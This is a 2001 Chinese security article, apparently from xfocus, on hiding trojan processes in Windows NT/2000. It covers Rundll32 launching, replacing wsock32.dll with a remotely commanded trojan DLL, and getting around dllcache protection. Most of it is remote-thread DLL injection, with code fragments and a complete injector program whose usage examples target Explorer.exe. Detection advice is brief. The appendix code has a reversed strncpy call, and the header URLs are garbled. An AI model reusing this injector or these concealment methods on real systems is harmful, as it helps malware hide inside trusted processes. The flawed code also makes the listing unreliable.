---
title: "揭开木马的神秘面纱<四>"
date: 2001-05-29T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-183"
---

(quack_at_xfocus.org)

揭开木马的神秘面纱<四>

NT系统下木马进程的隐藏与检测

Shotgun<shotgun@xici.net>

    在WIN9X中，只需要将进程注册为系统服务就能够从进程查看器中隐形，可是这一切在WINNT中却完全不同，无论木马从端口、启动文件上如何巧妙地隐藏自己，始终都不能欺骗WINNT的任务管理器，以至于很多的朋友问我：在WINNT下难道木马真的再也无法隐藏自己的进程了？本文试图通过探讨WINNT中木马的几种常用隐藏进程手段，给大家揭示木马/后门程序在WINNT中进程隐藏的方法和查找的途径。

我们知道，在WINDOWS系统下，可执行文件主要是Exe和Com文件，这两种文件在运行时都有一个共同点，会生成一个独立的进程，查找特定进程是我们发现木马的主要方法之一（无论手动还是防火墙），随着入侵检测软件的不断发展，关联进程和SOCKET已经成为流行的技术（例如著名的FPort就能够检测出任何进程打开的TCP/UDP端口），假设一个木马在运行时被检测软件同时查出端口和进程，我们基本上认为这个木马的隐藏已经完全失败（利用心理因素而非技术手段欺骗用户的木马不在我们的讨论范围之内）。在NT下正常情况用户进程对于系统管理员来说都是可见的，要想做到木马的进程隐藏，有两个办法，第一是让系统管理员看不见（或者视而不见）你的进程；第二是不使用进程。

看不见进程的方法就是进行进程欺骗，为了了解如何能使进程看不见，我们首先要了解怎样能看得见进程：在Windows中有多种方法能够看到进程的存在：PSAPI（Process Status API），PDH（Performance Data Helper），ToolHelp API，如果我们能够欺骗用户或入侵检测软件用来查看进程的函数（例如截获相应的API调用，替换返回的数据），我们就完全能实现进程隐藏，但是一来我们并不知道用户/入侵检测软件使用的是什么方法来查看进程列表，二来如果我们有权限和技术实现这样的欺骗，我们就一定能使用其它的方法更容易的实现进程的隐藏。

第二种方法是不使用进程，不使用进程使用什么？为了弄明白这个问题，我们必须要先了解Windows系统的另一种“可执行文件”----DLL，DLL是Dynamic Link Library（动态链接库）的缩写，DLL文件是Windows的基础，因为所有的API函数都是在DLL中实现的。DLL文件没有程序逻辑，是由多个功能函数构成，它并不能独立运行，一般都是由进程加载并调用的。（你你你，你刚刚不是说不用进程了？）别急呀，听我慢慢道来：因为DLL文件不能独立运行，所以在进程列表中并不会出现DLL，假设我们编写了一个木马DLL，并且通过别的进程来运行它，那么无论是入侵检测软件还是进程列表中，都只会出现那个进程而并不会出现木马DLL，如果那个进程是可信进程，（例如资源管理器Explorer.exe，没人会怀疑它是木马吧？）那么我们编写的DLL作为那个进程的一部分，也将成为被信赖的一员而为所欲为。

运行DLL文件最简单的方法是利用Rundll32.exe，Rundll/Rundll32是Windows自带的动态链接库工具，可以用来在命令行下执行动态链接库中的某个函数，其中Rundll是16位而Rundll32是32位的（分别调用16位和32位的DLL文件），Rundll32的使用方法如下：

Rundll32.exe  DllFileName  FuncName

例如我们编写了一个MyDll.dll，这个动态链接库中定义了一个MyFunc的函数，那么，我们通过Rundll32.exe  MyDll.dll  MyFunc就可以执行MyFunc函数的功能。

如何运行DLL文件和木马进程的隐藏有什么关系么？当然有了，假设我们在MyFunc函数中实现了木马的功能，那么我们不就可以通过Rundll32来运行这个木马了么？在系统管理员看来，进程列表中增加的是Rundll32.exe而并不是木马文件，这样也算是木马的一种简易欺骗和自我保护方法（至少你不能去把Rundll32.exe删掉吧？）

使用Rundll32的方法进行进程隐藏是简易的，非常容易被识破。（虽然杀起来会麻烦一点）比较高级的方法是使用特洛伊DLL，特洛伊DLL的工作原理是替换常用的DLL文件，将正常的调用转发给原DLL，截获并处理特定的消息。例如，我们知道WINDOWS的Socket 1.x的函数都是存放在wsock32.dll中的，那么我们自己写一个wsock32.dll文件，替换掉原先的wsock32.dll（将原先的DLL文件重命名为wsockold.dll）我们的wsock32.dll只做两件事，一是如果遇到不认识的调用，就直接转发给wsockold.dll（使用函数转发器forward）；二是遇到特殊的请求（事先约定的）就解码并处理。这样理论上只要木马编写者通过SOCKET远程输入一定的暗号，就可以控制wsock32.dll（木马DLL）做任何操作。特洛伊DLL技术是比较古老的技术，因此微软也对此做了相当的防范，在Win2K的system32目录下有一个dllcache的目录，这个目录中存放着大量的DLL文件（也包括一些重要的exe文件），这个是微软用来保护DLL的法宝，一旦操作系统发现被保护的DLL文件被篡改（数字签名技术），它就会自动从dllcache中恢复这个文件。虽然说先更改dllcache目录中的备份再修改DLL文件本身可以绕过这个保护，但是可以想见的是微软在未来必将更加小心地保护重要的DLL文件，同时特洛伊DLL方法本身有着一些漏洞（例如修复安装、安装补丁、检查数字签名等方法都有可能导致特洛伊DLL失效），所以这个方法也不能算是DLL木马的最优选择。

DLL木马的最高境界是动态嵌入技术，动态嵌入技术指的是将自己的代码嵌入正在运行的进程中的技术。理论上来说，在Windows中的每个进程都有自己的私有内存空间，别的进程是不允许对这个私有空间进行操作的（私人领地、请勿入内），但是实际上，我们仍然可以利用种种方法进入并操作进程的私有内存。在多种动态嵌入技术中（窗口Hook、挂接API、远程线程），我最喜欢的是远程线程技术（其实、其实我就会这一种……），下面就为大家介绍一下远程线程技术。

远程线程技术指的是通过在另一个运行的进程中创建远程线程的方法进入那个线程的内存地址空间。我们知道，在进程中，可以通过CreateThread函数创建线程，被创建的新线程与主线程（就是进程创建时被同时自动建立的那个线程）共享地址空间以及其他的资源。但是很少有人知道，通过CreateRemoteThread也同样可以在另一个进程内创建新线程，被创建的远程线程同样可以共享远程进程（注意：是远程进程！）的地址空间，所以，实际上，我们通过创建一个远程线程，进入了远程进程的内存地址空间，也就拥有了那个远程进程相当多的权限：例如启动一个DLL木马（与进入进程内部相比，启动一个DLL木马是小意思，实际上我们可以随意篡改那个进程的数据）

闲话少说，我们来看代码：

首先，我们通过OpenProcess 来打开我们试图嵌入的进程（如果不允许打开，那么嵌入就无法进行了，这往往是由于权限不够引起的，例如你试图打开一个受系统保护的进程）

hRemoteProcess = OpenProcess(     PROCESS_CREATE_THREAD | //允许远程创建线程 

                            PROCESS_VM_OPERATION  | //允许远程VM操作

                            PROCESS_VM_WRITE,        //允许远程VM写

                            FALSE, dwRemoteProcessId );

由于我们后面需要写入远程进程的内存地址空间并建立远程线程，所以需要申请足够的权限（PROCESS_CREATE_THREAD、VM_OPERATION、VM_WRITE）。

然后，我们可以建立LoadLibraryW这个线程来启动我们的DLL木马，LoadLibraryW函数是在kernel32.dll中定义的，用来加载DLL文件，它只有一个参数，就是DLL文件的绝对路径名pszLibFileName，（也就是木马DLL的全路径文件名），但是由于木马DLL是在远程进程内调用的，所以我们首先还需要将这个文件名复制到远程地址空间：（否则远程线程读不到这个参数）

//计算DLL路径名需要的内存空间

int cb = (1 + lstrlenW(pszLibFileName)) * sizeof(WCHAR);

//使用VirtualAllocEx函数在远程进程的内存地址空间分配DLL文件名缓冲区

pszLibFileRemote = (PWSTR) VirtualAllocEx( hRemoteProcess, NULL, cb, 

                MEM_COMMIT, PAGE_READWRITE);

//使用WriteProcessMemory函数将DLL的路径名复制到远程进程的内存空间

iReturnCode = WriteProcessMemory(hRemoteProcess,

        pszLibFileRemote, (PVOID) pszLibFileName, cb, NULL);

//计算LoadLibraryW的入口地址

PTHREAD_START_ROUTINE pfnStartAddr = (PTHREAD_START_ROUTINE)

        GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");

说明一下，上面我们计算的其实是自己这个进程内LoadLibraryW的入口地址，但是因为kernel.dll模块在所有进程内的地址都是相同的（属于内核模块），所以这个入口地址同样适用于远程进程。

OK，万事俱备，我们通过建立远程线程时的地址pfnStartAddr（实际上就是LoadLibraryW的入口地址）和传递的参数pszLibFileRemote（我们复制到远程进程内存空间的木马DLL的全路径文件名）在远程进程内启动我们的木马DLL：

//启动远程线程LoadLibraryW，通过远程线程调用用户的DLL文件    

hRemoteThread = CreateRemoteThread(hRemoteProcess,     //被嵌入的远程进程

NULL, 0, 

                        pfnStartAddr,         //LoadLibraryW的入口地址

pszLibFileRemote, //木马DLL的全路径文件名

0, NULL);

至此，远程嵌入顺利完成，为了试验我们的DLL是不是已经正常的在远程线程运行，我编写了以下的测试DLL，这个DLL什么都不做，仅仅返回所在进程的PID：

BOOL APIENTRY DllMain(HANDLE hModule, DWORD reason, LPVOID lpReserved)

{    char * szProcessId = (char *)malloc(10*sizeof(char));

    switch (reason){

        case DLL_PROCESS_ATTACH:{

                //获取并显示当前进程ID

                _itoa(GetCurrentProcessId(), szProcessId, 10);

                MessageBox(NULL,szProcessId,"RemoteDLL",MB_OK);

            }

        default:

        return TRUE;

    }

}

当我使用RmtDll.exe程序将这个TestDLL.dll嵌入Explorer.exe进程后（PID=1208），该测试DLL弹出了1208字样的确认框，证明TestDLL.dll已经在Explorer.exe进程内正确地运行了。（木马已经成为Explorer.exe的一部分）

DLL木马的查找：查找DLL木马的基本思路是扩展进程列表至内存模块列表，内存模块列表将显示每个进程目前加载/调用的所有DLL文件，通过这种方法，我们能发现异常的DLL文件（前提是你对所有进程需要调用的模块都很熟悉，天哪，这几乎是没有可能的事，要知道随便哪个进程都会调用十七八个DLL文件，而Windows更是由数以千计的DLL所组成的，谁能知道哪个有用哪个没用？）对此，我写了一个内存模块查看软件，在[http://www.patching.net/shotgun/ps.zip](http://www.patching.net/shotgun/ps.zip)可以下载，该软件使用PSAPI，如果是NT4.0，需要PSAPI.dll的支持，所以我把PSAPI.dll也放在了压缩包里。

进一步想想，用远程线程技术启动木马DLL还是比较有迹可寻的，如果事先将一段代码复制进远程进程的内存空间，然后通过远程线程起动这段代码，那么，即使遍历进程内存模块也无济于事；或者远程线程切入某个原本就需要进行SOCKET操作的进程（如iExplorer.exe），对函数调用或数据进行某些有针对的修改……这样的木马并不需要自己打开端口，代码也只是存在于内存中，可以说如羚羊挂角，无迹可寻。

无论是使用特洛伊DLL还是使用远程线程，都是让木马的核心代码运行于别的进程的内存空间，这样不仅能很好地隐藏自己，也能更好的保护自己。

这个时候，我们可以说已经实现了一个真正意义上的木马，它不仅欺骗、进入你的计算机，甚至进入了用户进程的内部，从某种意义上说，这种木马已经具备了病毒的很多特性，例如隐藏和寄生（和宿主同生共死），如果有一天，出现了具备所有病毒特性的木马（不是指蠕虫，而是传统意义上的寄生病毒），我想我并不会感到奇怪，倒会疑问这一天为什么这么迟才到来。


附录：利用远程线程技术嵌入进程的模型源码：

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

//                                                                      //

//    Remote DLL  For Win2K by Shotgun                                    //

//              This Program can inject a DLL into Remote Process              //

//                                                                      //

//    Released:    [2001.4]                                                    //

//    Author:        [Shotgun]                                               //

//   Email:        [Shotgun@Xici.Net]                                      //

//    Homepage:                                                           //

//                [[http://IT.Xici.Net]                                        //](http://IT.Xici.Net]�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2//)

//                [[http://WWW.Patching.Net]                                ](http://WWW.Patching.Net]�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2�0�2) //

//                                                                      //

//   USAGE:                                                            //

//              RmtDLL.exe PID[|ProcessName] DLLFullPathName             //

//   Example:                                                           //

//              RmtDLL.exe 1024 C:\WINNT\System32\MyDLL.dll             //

//              RmtDLL.exe Explorer.exe C:\MyDLL.dll                       //

//                                                                      //

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include<windows.h>

#include<stdlib.h>

#include<stdio.h>

#include<psapi.h>


DWORD ProcessToPID( char *);            //将进程名转换为PID的函数

void  CheckError  ( int, int, char *);        //出错处理函数

void  usage       ( char *);            //使用说明函数


PDWORD pdwThreadId; 

HANDLE hRemoteThread, hRemoteProcess;

DWORD  fdwCreate, dwStackSize, dwRemoteProcessId;

PWSTR  pszLibFileRemote=NULL;


void main(int argc,char **argv)

{

    int iReturnCode;

    char lpDllFullPathName[MAX_PATH];

    WCHAR pszLibFileName[MAX_PATH]={0};

    //处理命令行参数

    if (argc!=3) usage("Parametes number incorrect!");

    else{

        //如果输入的是进程名，则转化为PID

        if(isdigit(*argv[1])) dwRemoteProcessId = atoi(argv[1]);

        else dwRemoteProcessId = ProcessToPID(argv[1]);

        //判断输入的DLL文件名是否是绝对路径

        if(strstr(argv[2],":\\")!=NULL)

            strncpy(argv[2], lpDllFullPathName, MAX_PATH);

        else

        {    //取得当前目录，将相对路径转换成绝对路径

            iReturnCode = GetCurrentDirectory(MAX_PATH, lpDllFullPathName);

            CheckError(iReturnCode, 0, "GetCurrentDirectory");

            strcat(lpDllFullPathName, "\\");

            strcat(lpDllFullPathName, argv[2]);

            printf("Convert DLL filename to FullPathName:\n\t%s\n\n",

lpDllFullPathName);

        }

        //判断DLL文件是否存在

        iReturnCode=(int)_lopen(lpDllFullPathName, OF_READ);

        CheckError(iReturnCode, HFILE_ERROR, "DLL File not Exist");

        //将DLL文件全路径的ANSI码转换成UNICODE码

        iReturnCode = MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS,

lpDllFullPathName, strlen(lpDllFullPathName),

                                        pszLibFileName, MAX_PATH);

        CheckError(iReturnCode, 0, "MultByteToWideChar");

        //输出最后的操作参数

        wprintf(L"Will inject %s", pszLibFileName);

        printf(" into process:%s PID=%d\n", argv[1], dwRemoteProcessId);        

    }


    //打开远程进程

    hRemoteProcess = OpenProcess(PROCESS_CREATE_THREAD | //允许创建线程 

                                 PROCESS_VM_OPERATION | //允许VM操作

                                 PROCESS_VM_WRITE,       //允许VM写

                                 FALSE, dwRemoteProcessId );    

    CheckError( (int) hRemoteProcess, NULL, 

                "Remote Process not Exist or Access Denied!");

    //计算DLL路径名需要的内存空间

    int cb = (1 + lstrlenW(pszLibFileName)) * sizeof(WCHAR);

    pszLibFileRemote = (PWSTR) VirtualAllocEx( hRemoteProcess, NULL, cb, 

                        MEM_COMMIT, PAGE_READWRITE);

    CheckError((int)pszLibFileRemote, NULL, "VirtualAllocEx");

    //将DLL的路径名复制到远程进程的内存空间

    iReturnCode = WriteProcessMemory(hRemoteProcess, 

        pszLibFileRemote, (PVOID) pszLibFileName, cb, NULL);

    CheckError(iReturnCode, false, "WriteProcessMemory");

    //计算LoadLibraryW的入口地址

    PTHREAD_START_ROUTINE pfnStartAddr = (PTHREAD_START_ROUTINE)

        GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");

    CheckError((int)pfnStartAddr, NULL, "GetProcAddress");

    //启动远程线程，通过远程线程调用用户的DLL文件    

    hRemoteThread = CreateRemoteThread( hRemoteProcess, NULL, 0,                                                         pfnStartAddr, pszLibFileRemote, 0, NULL);

    CheckError((int)hRemoteThread, NULL, "Create Remote Thread");

    //等待远程线程退出

    WaitForSingleObject(hRemoteThread, INFINITE);

    //清场处理

    if (pszLibFileRemote != NULL)

        VirtualFreeEx(hRemoteProcess, pszLibFileRemote, 0, MEM_RELEASE);

    if (hRemoteThread != NULL) CloseHandle(hRemoteThread );

    if (hRemoteProcess!= NULL) CloseHandle(hRemoteProcess);

}//end of main()


//将进程名转换为PID的函数

DWORD ProcessToPID(char *InputProcessName)

{

    DWORD aProcesses[1024], cbNeeded, cProcesses;

    unsigned int i;

    HANDLE hProcess;

    HMODULE hMod;

    char szProcessName[MAX_PATH] = "UnknownProcess";


    // 计算目前有多少进程, aProcesses[]用来存放有效的进程PIDs

    if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )  return 0;

    cProcesses = cbNeeded / sizeof(DWORD);

    // 按有效的PID遍历所有的进程

    for ( i = 0; i < cProcesses; i++ ) 

    {

        // 打开特定PID的进程

        hProcess = OpenProcess( PROCESS_QUERY_INFORMATION |

 PROCESS_VM_READ,

                 FALSE, aProcesses[i]);

        // 取得特定PID的进程名

        if ( hProcess )

        {

            if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) )

            {

                GetModuleBaseName( hProcess, hMod, 

szProcessName, sizeof(szProcessName) );

                //将取得的进程名与输入的进程名比较，如相同则返回进程PID

                if(!_stricmp(szProcessName, InputProcessName)){

                    CloseHandle( hProcess );

                    return aProcesses[i];

                }

            }

        }//end of if ( hProcess )

    }//end of for

    //没有找到相应的进程名，返回0

    CloseHandle( hProcess );

    return 0;

}//end of ProcessToPID


//错误处理函数CheckError()

//如果iReturnCode等于iErrorCode,则输出pErrorMsg并退出

void CheckError(int iReturnCode, int iErrorCode, char *pErrorMsg)

{

    if(iReturnCode==iErrorCode) {

        printf("%s Error:%d\n\n", pErrorMsg, GetLastError());

        //清场处理

        if (pszLibFileRemote != NULL)

            VirtualFreeEx(hRemoteProcess, pszLibFileRemote, 0, MEM_RELEASE);

        if (hRemoteThread != NULL) CloseHandle(hRemoteThread );

        if (hRemoteProcess!= NULL) CloseHandle(hRemoteProcess);

        exit(0);

    }

}//end of CheckError()


//使用方法说明函数usage()

void usage(char * pErrorMsg)

{

    printf("%s\n\n",pErrorMsg);

    printf("\t\tRemote Process DLL by Shotgun\n");

    printf("\tThis program can inject a DLL into remote process\n");

    printf("Email:\n");

    printf("\tShotgun@Xici.Net\n");

    printf("HomePage:\n");

    printf("\thttp://It.Xici.Net\n");

    printf("\thttp://www.Patching.Net\n");

    printf("USAGE:\n");

    printf("\tRmtDLL.exe PID[|ProcessName] DLLFullPathName\n");

    printf("Example:\n");

    printf("\tRmtDLL.exe 1024 C:\\WINNT\\System32\\MyDLL.dll\n");

    printf("\tRmtDLL.exe Explorer.exe C:\\MyDLL.dll\n");

    exit(0);

}//end of usage()
